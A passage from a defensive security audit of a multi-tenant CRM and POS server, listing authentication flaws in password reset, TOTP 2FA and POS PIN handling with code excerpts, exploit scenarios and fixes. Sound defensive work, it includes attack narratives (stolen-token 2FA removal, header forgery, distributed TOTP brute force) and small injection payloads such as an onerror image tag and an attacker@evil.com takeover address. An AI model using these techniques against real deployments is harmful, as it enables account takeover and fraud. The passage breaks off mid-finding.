// reset-password (L1790):
if (!password || password.length < 8 || password.length > 128) { ... }
// change-password (L2236):
if (newPassword.length > 256) { ... }
```

**Exploit:**
A user changes their password to a 200-character passphrase. Their account is later compromised. They go through the forgot-password flow and try to set the same 200-char passphrase as the new password — the reset endpoint rejects it as too long. They are confused and may be blocked from recovery.

**Fix:**
Standardize the maximum password length to a single constant (128 characters, matching bcrypt's effective 72-byte limit, is reasonable) and use it in both `reset-password` and `change-password`.

---

### [MEDIUM] Admin email change carries no audit event, no old-address notification, no re-auth (PASS 2 expansion)

**Where:** `packages/server/src/routes/settings.routes.ts:1101,1194-1200`

**What:**
The prior pass noted the missing re-auth for email changes. This pass confirms there is also no `email_changed` audit event emitted — the only audit entries fired on `PUT /settings/users/:id` are `password_changed_by_admin`, `user_role_changed`, and `pin_changed_by_admin`. An email change leaves no audit trail, making forensic detection impossible. Additionally, the `targetBefore` record (line 1036–1037) fetches `id, username, role, is_active, password_hash` but not the old email, so even building a before-after diff for an audit event would require an additional query.

**Code:**
```typescript
const sensitiveChange = !!password || !!pin || isRoleChange;
// email is NOT included above — no re-auth and no audit for email changes
if (password) {
  audit(db, 'password_changed_by_admin', ...);
}
if (isRoleChange) {
  audit(db, 'user_role_changed', ...);
}
// No audit for email change
```

**Exploit:**
An attacker with a stolen admin token changes a target user's email to `attacker@evil.com`. No audit event is recorded. The attacker calls `/forgot-password` for the new address. The victim has no way to detect this through the audit log or an email notification to their old address.

**Fix:**
(1) Fetch the target user's old email inside the `PUT /settings/users/:id` handler. (2) Detect whether `email` in the request body differs from the current value. (3) If so, include email in `sensitiveChange`, emit `email_changed_by_admin` audit event with before/after values, and send a security notification to the old address. (4) Add `email` to the `sensitiveChange` guard to require admin re-auth.

---

### [LOW] Forgot-password rate limit does not include a per-target-email cap

**Where:** `packages/server/src/routes/auth.routes.ts:1651`

**What:**
The `/forgot-password` endpoint rate-limits by attacker IP only. An attacker controlling N IP addresses (botnet) can send unlimited reset emails to any target email address — each IP gets 3 attempts/hour, and all N IPs can target the same victim email simultaneously. There is no per-target-email ceiling anywhere in the flow.

**Code:**
```typescript
// Only keyed by ip, not by target email:
if (!checkWindowRate(db, 'forgot_password', ip, 3, 3600_000)) { ... }
```

**Exploit:**
A botnet with 1,000 IPs can generate 3,000 password-reset emails per hour to a single victim address, constituting email-bomb DoS that may cause the victim's mailbox to be throttled, quarantined, or to miss legitimate emails.

**Fix:**
Add a secondary rate limit keyed by the normalized target email address, stored in the master DB so it spans tenants. A cap of 5–10 reset emails per email address per hour is generous for legitimate use.

---

### [LOW] `user.username` interpolated unescaped into reset email HTML

**Where:** `packages/server/src/routes/auth.routes.ts:1759`

**What:**
The reset email is constructed by directly interpolating `user.username` into an HTML template literal. The `username` field has no HTML-encoding applied before insertion. While `sanitizeEmailHtml()` in `email.ts` strips `<script>` blocks and `on*=` handlers via regex, it does not HTML-encode regular text — a username of `<b>attacker</b>` would render as bold text in the recipient's email client, and a username of `<img src=x onerror=...>` may partially evade the regex strip.

**Code:**
```typescript
html: `<p>Hi ${user.username},</p><p>Click the link below to reset...`,
// username is stored as-is: no htmlEscape() call
```

**Exploit:**
An admin creates a staff user with username `</p><p style="color:red">Your account has been compromised. Call 555-0123 immediately.</p><p>`. The victim receives a branded phishing email from the legitimate CRM SMTP address with manipulated HTML content, lending credibility to a vishing or credential-theft attack.

**Fix:**
Pass `user.username` through the existing `escapeHtml()` utility (`packages/server/src/utils/escape.ts:28`) before inserting it into any HTML email template. Apply the same fix to `shopName` in `signup.routes.ts:503`.

---

### [INFO] In-memory signup counters (`signupEmailCounters`, `slugCheckCounters`) reset on process restart

**Where:** `packages/server/src/routes/signup.routes.ts:39,217`

**What:**
The per-email and per-IP slug-check counters are `Map` objects in process memory. A process restart (e.g., `pm2 restart`, container redeploy, crash) clears them, resetting the hourly caps. An attacker can trigger a restart (e.g., by exploiting a crash in a different route) to regain their full hourly signup/slug-check quota.

**Code:**
```typescript
const signupEmailCounters = new Map<string, EmailRateEntry>(); // in-memory
const slugCheckCounters = new Map<string, SlugCheckCounter>(); // in-memory
```

**Exploit:**
Low severity in practice because the SQLite-backed per-IP rate limit (`checkWindowRate`) on the main signup flow survives restarts. The in-memory counters are supplemental caps. However, a targeted crash+reconnect could bypass the email ceiling.

**Fix:**
Migrate `signupEmailCounters` to the SQLite-backed `rate_limits` table using the existing `checkWindowRate` infrastructure, consistent with the approach used for login/TOTP/PIN limits.

---

### [INFO] `reset_token_expires` stored as ISO string text, compared with SQLite `datetime('now')` — timezone assumption

**Where:** `packages/server/src/routes/auth.routes.ts:1720,1814`; `packages/server/src/db/migrations/065_password_reset_tokens.sql`

**What:**
`reset_token_expires` is stored as a JavaScript ISO string (`new Date(...).toISOString()` → UTC, e.g. `2026-05-06T14:22:00.000Z`) and compared via `reset_token_expires > datetime('now')`. SQLite's `datetime('now')` returns UTC without the `Z` suffix (e.g. `2026-05-06 14:22:00`). ISO 8601 strings with `Z` suffix sort lexicographically after bare UTC strings of the same timestamp (because `Z` > ` `), so the comparison happens to work by accident, but is fragile and not documented as intentional.

**Code:**
```typescript
const expiresAt = new Date(Date.now() + 60 * 60 * 1000).toISOString();
// Stored as "2026-05-06T14:22:00.000Z"
// Compared via: reset_token_expires > datetime('now')
// datetime('now') returns "2026-05-06 14:22:00"
```

**Exploit:**
No current exploit — the lexicographic order coincidentally produces correct results. However, if a future migration changes the storage format (e.g., storing unix timestamps) or SQLite's `datetime()` output changes, the expiry comparison silently breaks in one direction without raising an error.

**Fix:**
Use `strftime('%Y-%m-%dT%H:%M:%SZ', 'now')` instead of `datetime('now')` in the comparison, or store expiry as a Unix epoch integer (seconds) and compare with `unixepoch('now')`. Document the format assumption in a comment.

---


---

# S03-2fa-totp

# S03 — Two-Factor Auth (TOTP), Step-Up Auth, Recovery Codes

## Findings

---

### [HIGH] In-tenant `/force-disable-2fa` missing re-auth / step-up

- File: `packages/server/src/routes/auth.routes.ts:1995`
- Description: `POST /force-disable-2fa/:userId` requires only `role === 'admin'` — no password confirmation, no TOTP step-up. Any hijacked admin session token (stolen cookie, XSS, network intercept within the 30-min access-token TTL) can silently strip 2FA from any user in the tenant, allowing subsequent account takeover with just the victim's password.
- Exploit: Attacker with stolen admin JWT sends `POST /force-disable-2fa/42` → victim's TOTP cleared → attacker logs in with victim's password alone.
- Compare: The _self-service_ `/account/2fa/disable` requires both `currentPassword` + current TOTP code (line 1908–1959). The _super-admin_ variant (`/tenants/:slug/users/:userId/force-disable-2fa`) is correctly gated with `requireStepUpTotpSuperAdmin` (super-admin.routes.ts:1207). Only the in-tenant admin path is unprotected.
- Fix: Add `admin_confirm_password` + `admin_totp_code` re-auth (same pattern used at settings.routes.ts:1672–1723), or apply `requireStepUpTotp` as middleware on this route.

---

### [MEDIUM] Challenge tokens not validated against tenant — cross-tenant auth confusion

- File: `packages/server/src/routes/auth.routes.ts:190–213`
- Description: `validateChallenge` / `consumeChallenge` return only `userId` and never check `entry.tenantSlug` against the current request's `req.tenantSlug`. In a multi-tenant deployment each tenant has its own SQLite DB; integer user IDs are per-tenant-sequential (user 5 in tenant A is a different person than user 5 in tenant B). A challenge token created on tenant A's `/login` endpoint (for tenant-A user 5) can be submitted to tenant B's `/login/2fa-verify` endpoint. The server looks up user 5 in tenant B's DB; if found, that person is authenticated without entering a password.
- Exploit: Attacker creates an account in tenant A, triggers a login challenge for user ID 5 (or any ID they want to target), then submits that challenge token to tenant B's 2FA-verify endpoint from a browser session pointed at tenant B.
- Note: The comment at line 170 says "Challenge tokens include tenantSlug to prevent cross-tenant 2FA reuse" — the slug is stored in the Map entry but `validateChallenge` never reads it.
- Fix: In `validateChallenge` (and `consumeChallenge`), accept and compare the caller's `tenantSlug`; reject tokens whose stored `tenantSlug` does not match.

---

### [MEDIUM] Password reset does not clear device-trust cookies

- File: `packages/server/src/routes/auth.routes.ts:1784–1892`
- Description: `POST /reset-password` revokes all sessions (`DELETE FROM sessions WHERE user_id = ?`) but does not clear the `deviceTrust` cookie. A trusted-device cookie is a 90-day JWT that bypasses the TOTP challenge on login (line 851–858). If an attacker compromised a device and the user later resets their password expecting full re-lockdown, the existing `deviceTrust` cookie on the attacker's browser remains valid and continues to skip 2FA for the remainder of its 90-day lifetime.
- The self-service 2FA disable (line 1979) and explicit logout (line 1429) both clear `deviceTrust`. Password reset is the odd-one-out.
- Exploit: Attacker captures `deviceTrust` cookie from victim's laptop. Victim notices intrusion, resets password. Attacker still authenticates without 2FA for up to 90 days.
- Mitigation present: Device-trust cookie is fingerprinted to `SHA-256(UA + IP)` (line 846–850), so the attacker must use an identical User-Agent and source IP. On different hardware or network this is not reliably reproducible, lowering practical risk.
- Fix: Add `res.clearCookie('deviceTrust', { path: '/' })` inside the `POST /reset-password` success branch (after line 1888). Because this is an HTTP-only cookie the server can only set Max-Age=0 — but that covers the case where the victim and attacker share the same browser session. For stolen cookies the correct defense is rotating `DEVICE_TRUST_SECRET` (which invalidates all outstanding tokens) upon a coordinated incident.

---

### [LOW] `verifySync` window comment misleading — actual window is current-step-only

- File: `packages/server/src/middleware/stepUpTotp.ts:79–84`
- Description: The comment at line 79 states "verifySync accepts codes from the previous, current, AND next 30-second windows (±1 step skew)." This is incorrect for the version of otplib in use. The functional `verifySync` is called without `epochTolerance`, which defaults to `0`. With `epochTolerance: 0`, `normalizeEpochTolerance` returns `[0, 0]`, giving `minCounter === maxCounter === currentCounter` — only the exact current window is accepted.
- Impact: None on security (stricter is better). However the three-bucket replay-cache logic was implemented to handle a tolerance that does not actually exist in the library call, adding unnecessary complexity. The code is correct but the justification is wrong — if a future developer adjusts the `verifySync` call to add tolerance (e.g., to handle clock-skew complaints), the three-bucket cache correctly handles it; but the current deployed state doesn't need it.
- Fix: Update the comment to accurately reflect `epochTolerance: 0` behavior, or explicitly pass `epochTolerance: 30` (one-step tolerance) to align implementation with the comment's intent and improve usability for users with slightly drifted authenticator clocks.

---

### [LOW] TOTP replay cache is process-local — unsafe in multi-process deployments

- File: `packages/server/src/middleware/stepUpTotp.ts:58`
- Description: `consumedCodes` is an in-process `Map`. If the server is ever run with multiple Node.js workers (e.g., PM2 cluster mode, Kubernetes with horizontal scaling), each process maintains an independent replay map. A TOTP code consumed by worker 1 is unknown to worker 2; the same code can be replayed to any other worker within the 30-second window.
- Current state: No `cluster`/`worker_threads` usage was found in `packages/server/src/index.ts`, so this is not an active vulnerability today.
- Fix: If horizontal scaling is adopted, move the replay store to a shared backend (e.g., a SQLite `totp_consumed_codes` table with a TTL sweep, consistent with the existing SQLite-backed rate limiter pattern in `utils/rateLimiter.ts`).

---

### [INFO] TOTP encryption key derived from `jwtSecret` concatenation (v1/v2 legacy)

- File: `packages/server/src/routes/auth.routes.ts:90–97`
- Description: Legacy v1 and v2 encryption keys are derived via raw `SHA-256` over string concatenations of `jwtSecret` and `superAdminSecret`. These are decryption-only paths (new secrets encrypt with v3 HKDF). The comment at line 70–89 accurately documents the limitation. No new writes use these keys.
- Status: Residual risk only while v1/v2 ciphertexts remain in the database. A migration to re-encrypt all rows to v3 would eliminate the legacy paths entirely.

---

### [INFO] Recovery-code entropy: 80 bits (Crockford base32, 8 codes, bcrypt-hashed)

- File: `packages/server/src/routes/auth.routes.ts:1042–1056`
- Description: Each recovery code is 16 Crockford-base32 characters (5 bits each = 80 bits entropy), generated from `crypto.randomBytes(16)` with no modulo bias (256 % 32 = 0). Eight codes are issued. Codes are bcrypt-hashed (cost 12) at rest. Consumption is atomic (conditional `JSON_REMOVE` UPDATE). No issues found.

---

### [INFO] Step-up middleware coverage — admin actions, billing, secret reads

- Description: `requireStepUpTotp` covers PII exports (customers, reports, settings export, tenant export). `requireStepUpTotpSuperAdmin` covers all destructive super-admin operations (tenant delete/suspend/activate/update, JWT rotation, session kick, config write, backup run/restore/delete, DNS backfill, rate-limit reset, webhook retry). Billing (`/api/v1/billing/checkout`, `/billing/portal`) is not step-up gated; these mutate Stripe-side state and redirect to hosted Stripe pages, so omission is a conscious design choice (low blast radius). The one gap is the in-tenant `/force-disable-2fa` described above under HIGH.

---

## Summary

| Severity | Count |
|----------|-------|
| CRITICAL | 0 |
| HIGH     | 1 |
| MEDIUM   | 2 |
| LOW      | 2 |
| INFO     | 3 |

---

## PASS 2 — DEEP DIVE

### [MEDIUM] TOTP replay not prevented in login, switch-user, and 2FA-disable flows

**Where:** `packages/server/src/routes/auth.routes.ts:1017` (login/2fa-verify), `auth.routes.ts:1509` (switch-user), `auth.routes.ts:1947` (2fa-disable), `auth.routes.ts:1138` (settings reauth)

**What:**
`claimCode()` replay prevention (SCAN-593) is only applied in the step-up middleware (`middleware/stepUpTotp.ts`). Every other TOTP verification call — `/login/2fa-verify`, `/switch-user`, `/account/2fa/disable`, and the admin password/role re-auth in `settings.routes.ts` — uses raw `verifySync` with no code-consumption tracking. A single valid TOTP code observed during one flow can be presented again to any of these endpoints within the same 30-second window.

**Code:**
```typescript
// auth.routes.ts:1017 — login/2fa-verify (no claimCode)
const isValid = verifySync({ token: code, secret });

// auth.routes.ts:1509 — switch-user TOTP (no claimCode)
isValid = Boolean(verifySync({ token: totpCode, secret }));

// auth.routes.ts:1947 — 2fa-disable TOTP (no claimCode)
totpValid = Boolean(verifySync({ token: totpCode, secret }));

// Contrast: middleware/stepUpTotp.ts:272 — step-up DOES claim the code
if (!claimCode(user.id, totpCode)) { return 403; }
```

**Exploit:**
An attacker who observes a user's TOTP code at login (e.g. shoulder-surfing the authenticator app) can — within the same 30-second window — call `POST /account/2fa/disable` with the same code and the user's password (already known, since the attacker just watched them log in), silently stripping 2FA. The account is then accessible with only the password for all future logins.

**Fix:**
Extract `claimCode` into a shared module (e.g. `utils/totpReplay.ts`) and call it in every TOTP verification path: `/login/2fa-verify`, `/login/2fa-backup`, `/switch-user`, `/account/2fa/disable`, and the settings reauth block. A user's code should be claimable only once per 90-second window regardless of which endpoint consumes it.

---

### [MEDIUM] Step-up TOTP middleware has no per-user brute-force lockout

**Where:** `packages/server/src/middleware/stepUpTotp.ts:201–286` (requireStepUpTotp), `stepUpTotp.ts:337–476` (requireStepUpTotpSuperAdmin)

**What:**
`requireStepUpTotp` and `requireStepUpTotpSuperAdmin` validate the `X-TOTP-Code` header but import no rate-limiting functions (no `checkLockoutRate`, no `checkWindowRate`). On failure they write an audit log entry and return 401, but apply no per-user lockout. The only defense is the global `/api/v1` rate limit of 300 req/min per IP (index.ts:1179), which is bypassed by rotating source IPs. An attacker holding a stolen access JWT can spray all 10^6 possible 6-digit codes across the 30-second TOTP window from a botnet.

**Code:**
```typescript
// stepUpTotp.ts — imports — no rate limiter imported
import crypto from 'crypto';
import { verifySync } from 'otplib';
import { audit } from '../utils/audit.js';
// ... no checkLockoutRate / checkWindowRate import

if (!valid) {
  audit(db, 'pii_export_totp_failed', user.id, ip, { endpoint: endpointLabel });
  res.status(401).json(errorBody(ERROR_CODES.ERR_INPUT_INVALID, 'Invalid TOTP', rid));
  return; // ← no lockout recorded
}
```

**Exploit:**
Attacker steals a tenant admin's access token (e.g. from browser local-storage XSS). The token grants a 1-hour window. Attacker rotates across N IPs and sends up to N × 300 TOTP guesses per minute against `GET /customers/:id/export`. TOTP windows are 30 seconds so each window allows N × 150 guesses; with N ≥ 7 IPs, an attacker exceeds 10^6/30s and can exhaustively cover one TOTP window.

**Fix:**
Add `checkLockoutRate(db, 'totp_stepup', `${userId}`, 5)` before the decrypt/verify step and call `recordLockoutFailure` on failure (same pattern as `checkTotpRateLimit` in `auth.routes.ts:230-236`). Five failed step-up attempts should trigger a 15-minute lockout keyed on the user ID, independent of IP.

---

### [MEDIUM] Super-admin TOTP verify has no per-account lockout on 2FA failures

**Where:** `packages/server/src/routes/super-admin.routes.ts:456–501`

**What:**
The super-admin `/login/2fa-verify` endpoint consumes the challenge token (single-use) but does not increment `failed_login_count` or set `locked_until` on TOTP failure. The `failed_login_count` column is only incremented on password failure (line 338) and only reset to 0 on complete 2FA success (line 519). An attacker who knows the super-admin password can replay the full password-then-TOTP flow — each time receiving a new challenge token — limited only by the IP-keyed challenge-creation cap of 10 per 15 minutes (line 356). With 10 IPs, that is 100 TOTP guesses per 15 minutes against the super-admin TOTP with no account lockout triggered.

**Code:**
```typescript
// super-admin.routes.ts:498-501 — TOTP failure: only audit, no lockout
if (!verified) {
  const ip = req.ip || 'unknown';
  auditLog('super_admin_2fa_failed', admin.id, ip);
  return res.status(401).json({ success: false, message: 'Invalid code. Try again.' });
  // ← no failed_login_count increment, no locked_until update
}
```

**Exploit:**
Attacker phishes or leaks a super-admin password. Uses that password to obtain challenge tokens from N IPs (N × 10 challenges per 15 min). For each challenge, submits one TOTP guess. After 10 attempts per IP-window across enough IPs, an attacker can systematically enumerate the 10^6 TOTP space with no account-level lockout. At N=7 IPs: 4,666 guesses per hour with no account lockout.

**Fix:**
On TOTP verification failure in `/login/2fa-verify`, apply the same `failed_login_count` increment + `locked_until` update that password failure applies (lines 336–344). A super-admin should lock out after N combined password-or-TOTP failures, not password-only failures.

---

### [INFO] Super-admin `epochTolerance: 30` widens TOTP replay surface to 3 windows

**Where:** `packages/server/src/routes/super-admin.routes.ts:493`

**What:**
The super-admin login `/login/2fa-verify` passes `epochTolerance: 30` to `verifySync`, accepting codes from the previous, current, and next 30-second step — a 90-second acceptance window. The tenant-user login path uses the default tolerance of 0 (single window only). Because the super-admin login consumes the challenge token before the TOTP check but does not claim the code, an intercepted code is usable for up to 90 seconds after it first appears in any 30-second step.

**Code:**
```typescript
// super-admin.routes.ts:493 — 3-window acceptance
verified = Boolean(verifySync({ token: code, secret: totpSecret, epochTolerance: 30 }));

// auth.routes.ts:1017 — single-window acceptance (default tolerance: 0)
const isValid = verifySync({ token: code, secret });
```

**Exploit:**
An adversary who intercepts a super-admin TOTP code (e.g. via a compromised authenticator backup) has up to 90 seconds to use it for login, vs. 30 seconds for tenant logins. The wider window is already partially mitigated because the challenge token is single-use, but it increases the effective lifetime of a stolen code.

**Fix:**
Either match the tenant path (remove `epochTolerance: 30`, accept clock skew via NTP and warn users) or add `claimCode` to the super-admin login 2FA-verify path so a code consumed during login is poisoned for the full 90 seconds. The more useful fix is per-account TOTP lockout (see finding above), which limits enumeration more broadly.

---

### [INFO] deviceTrust cookie not bound to tenantSlug — cross-tenant reuse possible in path-based routing

**Where:** `packages/server/src/routes/auth.routes.ts:1076–1090`

**What:**
The deviceTrust JWT payload is `{ userId, type: 'device_trust', fp: fingerprint }` with no `tenantSlug` field. In subdomain-based multi-tenant routing (the default) this is not exploitable because cookies are host-scoped. However, if a deployment uses path-based routing (e.g. `example.com/tenant-a/` and `example.com/tenant-b/`), a deviceTrust cookie issued by tenant A's login flow would be accepted by tenant B's login handler if tenant B also has a user with the same integer user ID, the same UA+IP fingerprint, and the same `deviceTrustKey` (both tenants share the process-level key derived from `DEVICE_TRUST_SECRET`).

**Code:**
```typescript
const deviceToken = jwt.sign(
  { userId: user.id, type: 'device_trust', fp: fingerprint },
  // ← no tenantSlug in payload
  deviceTrustKey,
  { ...JWT_SIGN_OPTIONS, expiresIn: '90d' }
);
```

**Exploit:**
Only exploitable in path-prefix multi-tenant deployments. Not exploitable in default subdomain mode. If path routing is ever adopted, an attacker with a valid deviceTrust cookie for user 5 on tenant A can skip 2FA for user 5 on tenant B during the same 90-day window.

**Fix:**
Add `tenantSlug: req.tenantSlug || null` to the deviceTrust JWT payload and verify it at login (line 851) alongside `payload.userId`.

---

### [INFO] Login response discloses 2FA enrollment status before factor verification

**Where:** `packages/server/src/routes/auth.routes.ts:876–881`

**What:**
After a correct password, the `/login` endpoint responds with `{ totpEnabled: !!user.totp_enabled, requires2faSetup: !user.totp_enabled }`. This tells an attacker, per-account, whether the target has enrolled 2FA — before any second factor is checked. While the information is not directly exploitable on its own, it gives attackers a signal to prioritize accounts without 2FA enrollment for follow-on credential-stuffing attacks and know which accounts can be taken over with only a password.

**Code:**
```typescript
res.json({
  success: true,
  data: {
    challengeToken,
    totpEnabled: !!user.totp_enabled,        // ← reveals 2FA status
    requires2faSetup: !user.totp_enabled,    // ← reveals 2FA status
    requiresPasswordSetup: false,
  },
});
```

**Exploit:**
Attacker runs a list of usernames through `/login` with a guessed/leaked password and collects the `totpEnabled` field to identify accounts that have no 2FA, then targets only those accounts for full account takeover.

**Fix:**
Always return `totpEnabled: true` from the response regardless of actual enrollment status, or omit the field entirely and redirect unenrolled users via a different mechanism (e.g. redirect to setup after issue of the access token). The client-side 2FA-setup flow can instead be driven by a flag embedded in the access token claims.

---

## Summary — Pass 2 additions

| Severity | New in Pass 2 | Pass 1 total | Combined |
|----------|--------------|-------------|---------|
| CRITICAL | 0 | 0 | 0 |
| HIGH     | 0 | 1 | 1 |
| MEDIUM   | 3 | 2 | 5 |
| LOW      | 0 | 2 | 2 |
| INFO     | 3 | 3 | 6 |


---

# S04-pos-pin

# S04 — POS PIN Authentication

## Findings

---

### [HIGH] `/pos/sales` sale endpoint bypasses `requirePosPinSale` middleware

- File: `packages/server/src/routes/pos.routes.ts:941`
- Description: `POST /pos/transaction` (line 253) is gated by `requirePosPinSale`. `POST /pos/sales` (line 941) is a parallel sale-completion path — it creates invoices, processes payments, decrements stock, and records employee tips — but carries **no** `requirePosPinSale` middleware and no inline PIN check. When `pos_require_pin_sale` is enabled in `store_config`, the intended PIN gate is fully bypassed by calling `/pos/sales` instead of `/pos/transaction`.
- Exploit: An authenticated POS user (any role including cashier) calls `POST /pos/sales` directly. The `pos_require_pin_sale` flag has no effect on this path. PIN-protected POS sale controls are neutralized.
- Fix: Add `requirePosPinSale` as the first middleware on the `/sales` route, or consolidate both endpoints behind a single handler that always enforces the configured PIN policy.

---

### [MEDIUM] PIN rate limiter on `/auth/switch-user` is IP-only — shared POS terminal causes mutual lockout and enables cross-employee enumeration

- File: `packages/server/src/routes/auth.routes.ts:1438-1530`
- Description: `checkPinRateLimit` / `recordPinFailure` key exclusively on the client IP address (not on `(IP, targetUserId)` or any per-employee dimension). All employees at a shared POS terminal share the same IP. Consequence (a) **DoS**: five failed PIN attempts by any one employee (or a single bad actor at the terminal) trips a 15-minute lockout for the entire POS station — all staff cannot switch users. Consequence (b) **enumeration**: an attacker with a single valid session can submit 4 attempts for employee A, 1 success (which `clearPinFailures` resets the counter), then repeat for employee B, cycling through all employee PINs with only 5 net failures ever recorded per 15-minute window.
- Exploit: Attacker submits 4 wrong PINs, then 1 correct PIN for any employee. `clearPinFailures` resets the IP counter. Attacker rotates to the next employee's PIN space with a fresh 5-attempt budget — effectively unlimited brute-force.
- Fix: Key the rate limiter on `(IP, targetUserId)` per employee. A single correct match should clear failures only for that `(IP, userId)` pair, not for the whole IP. Consider a secondary per-IP cap as a defense-in-depth DoS protection rather than the sole mechanism.

---

### [MEDIUM] Admin-set PIN has no format constraint (any 1-32 char string); self-service PIN enforces 4-6 digits — inconsistency allows 1-digit PINs

- File: `packages/server/src/routes/settings.routes.ts:952,1010` vs `packages/server/src/routes/auth.routes.ts:2352`
- Description: `POST /settings/users` and `PUT /settings/users/:id` validate `pin.length <= 32` with no numeric or minimum-length requirement. An admin can set an employee PIN of `"1"`. The self-service `/auth/change-pin` endpoint validates `^\d{4,6}$`. The switch-user and clock-in/out paths accept any PIN of length 1-20. This creates a two-tier policy: admins can set trivially weak PINs that the self-service path would reject.
- Exploit: Admin sets employee PIN to `"1"` at account creation. Switch-user and clock-in succeed with a single-keystroke PIN; brute force is trivial (1 attempt).
- Fix: Enforce the same `^\d{4,6}$` regex on admin PIN create/update paths (settings.routes.ts lines 952 and 1010) so the format policy is uniform regardless of who sets the PIN.

---

### [LOW] `requirePosPin` enforced by a client-supplied header (`X-Pos-Pin-Verified: 1`) with no server-side session binding — "verified once, valid forever" within the HTTP request scope

- File: `packages/server/src/middleware/requirePosPin.ts:46,71,106`
- Description: The middleware checks `req.headers['x-pos-pin-verified'] === '1'`. Any authenticated client that sets this header value bypasses the PIN gate — there is no server-side token, timestamp, or session state binding the header to a real `/auth/verify-pin` call. The security depends entirely on the client voluntarily calling `/auth/verify-pin` first and then (honestly) echoing the result as a header. A malicious or tampered client can set `X-Pos-Pin-Verified: 1` on every request without ever calling `/auth/verify-pin`.
- Exploit: An attacker with a valid JWT (e.g. stolen from localStorage or via XSS) adds `X-Pos-Pin-Verified: 1` to a `POST /pos/transaction` request. No PIN was entered; the gate passes.
- Fix: Issue a short-lived, server-signed, per-user PIN-verification token from `/auth/verify-pin` (e.g. a HMAC-signed opaque value stored in `sessions` with a 5-minute TTL). The middleware validates the token server-side rather than trusting the header value.

---

### [LOW] PIN brute-force lockout on `/auth/switch-user` is cleared on any successful PIN match — success for one employee unlocks attempts against all others

- File: `packages/server/src/routes/auth.routes.ts:1529`
- Description: `clearPinFailures(db, ip)` is called after any successful switch-user regardless of which employee's PIN matched. Because the failure counter is IP-keyed (see MEDIUM above), a single successful match resets the entire IP budget, allowing an attacker to make 4 attempts → succeed with a known PIN → reset → repeat indefinitely.
- Exploit: See MEDIUM finding above. Specifically: an attacker who knows one employee's PIN can always reset the counter and get 4 fresh attempts against the next employee in a 10-key PIN space.
- Fix: Addressed by fixing the MEDIUM issue (per-employee key). Once the key is `(IP, userId)`, clearing on success is safe because it only clears that user's counter.

---

### [LOW] `requirePosPin` middleware silently falls through when `db` is absent (`if (!db) { next(); return; }`)

- File: `packages/server/src/middleware/requirePosPin.ts:41,66,96`
- Description: All three exported guard functions call `next()` unconditionally when `req.db` is falsy. This is documented as a safety valve but means any misconfigured request context (e.g. during testing, misconfigured middleware order, or a future multi-DB routing change) will silently permit PIN-gated operations without PIN verification.
- Exploit: Low practical risk in production, but the pattern means a configuration error disables security rather than failing safe. A future middleware ordering change could expose this path.
- Fix: Fail closed: return 503 or 500 when `db` is absent rather than passing the request through. A missing DB handle is a configuration error, not a case where the PIN requirement should be waived.

---

### [INFO] Clock-in/clock-out PIN uses per-`(employeeId, IP)` rate limiter — correct and independent of the switch-user IP-only limiter

- File: `packages/server/src/routes/employees.routes.ts:327,427`
- Description: The clock-in and clock-out PIN verification use `checkWindowRate(req.db, 'clock_pin', \`${id}:${req.ip}\`, 5, 900_000)` — keyed on `(targetUserId, IP)`. This is the correct design and correctly scopes lockouts per employee per workstation.
- Exploit: N/A — behavior is correct.
- Fix: No action required. Note for the fix of the MEDIUM above: adopt this same key shape for switch-user.

---

### [INFO] PIN not present in any audit log detail payload or error message body

- Files reviewed: `packages/server/src/routes/auth.routes.ts`, `packages/server/src/routes/employees.routes.ts`, `packages/server/src/routes/posEnrich.routes.ts`
- Description: All audit calls pass structured objects that never include `pin` or `req.body.pin`. Error messages return "Invalid PIN" without echoing the submitted value. No plaintext PIN leakage found in logs or responses.
- Exploit: N/A.
- Fix: No action required.

---

### [INFO] Admin PIN reset requires `admin_confirm_password` (and TOTP if enabled) — no existing-PIN re-verify required, but re-auth is present

- File: `packages/server/src/routes/settings.routes.ts:1101-1153`
- Description: `PUT /settings/users/:id` requires the admin to supply their own current password to change another user's PIN (`sensitiveChange` guard). The target user's existing PIN is not required for the admin to overwrite it. This is correct admin-override behavior and is authenticated via the admin's own credentials. The audit trail records `pin_changed_by_admin`.
- Exploit: N/A — intended behavior.
- Fix: No action required.

---

## PASS 2 — DEEP DIVE

### [HIGH] Manager PIN threshold (`pos_manager_pin_threshold`) not enforced server-side on sale completion

**Where:** `packages/server/src/routes/posEnrich.routes.ts:676-687` vs `packages/server/src/routes/pos.routes.ts:253,941,1384`

**What:**
The `pos_manager_pin_threshold` config (default $500) is checked exclusively inside `POST /pos-enrich/manager-verify-pin`, which returns `{ verified: true }` to the client. Neither `POST /pos/transaction`, `POST /pos/sales`, nor `POST /pos/checkout-with-ticket` query this threshold or verify that `/manager-verify-pin` was called before the sale was submitted. The enforcement is entirely client-side.

**Code:**
```typescript
// posEnrich.routes.ts:684-687 — only place threshold is checked:
if (sale > 0 && sale < threshold) {
  res.json({ success: true, data: { verified: true, threshold_cents: threshold, skipped: true } });
  return;
}
// pos.routes.ts:253 — sale completion has NO threshold check:
router.post('/transaction', requirePosPinSale, idempotent, asyncHandler(async (req, res) => {
  // ... no pos_manager_pin_threshold query or manager-pin-verified check
```

**Exploit:**
A cashier calls `POST /pos/transaction` directly with a $5,000 cart, skipping `/manager-verify-pin` entirely. The server completes the sale and creates the invoice. The $500 manager-approval gate is neutralized for all three sale paths.

**Fix:**
Add a server-side threshold check inside the `/pos/transaction` and `/pos/sales` handlers: read `pos_manager_pin_threshold` from `store_config`, compare the computed total, and if it exceeds the threshold reject the request unless a short-lived (30–60 second) server-issued manager-PIN token is present in the request header. The token should be created by `/manager-verify-pin` on success and validated (HMAC + expiry) on sale completion — not just a client-supplied header.

---

### [HIGH] `/pos/return` has no PIN gate and no per-line returned-quantity tracking — duplicate full-value returns

**Where:** `packages/server/src/routes/pos.routes.ts:2496-2637`

**What:**
`POST /pos/return` (admin/manager role required) checks only that `itemQty <= lineItem.quantity` (the original line quantity) before issuing a credit note. It does NOT track previously returned quantities: there is no `pos_return_line_items` table, no `returned_qty` column on `invoice_line_items`, and no query against the `refunds` table to accumulate prior credits for the same line. A manager can call `/pos/return` twice for the same `line_item_id` with `quantity: 1` against an original `quantity: 1` line and receive two full-value credit notes.

**Code:**
```typescript
// pos.routes.ts:2546-2548 — only guard is against original quantity, not previously returned qty:
if (itemQty > lineItem.quantity) {
  throw new AppError(`Return quantity (${itemQty}) exceeds invoiced quantity (${lineItem.quantity})`, 400);
}
// No query like: SELECT SUM(returned_qty) FROM refund_line_items WHERE line_item_id = ?
```

**Exploit:**
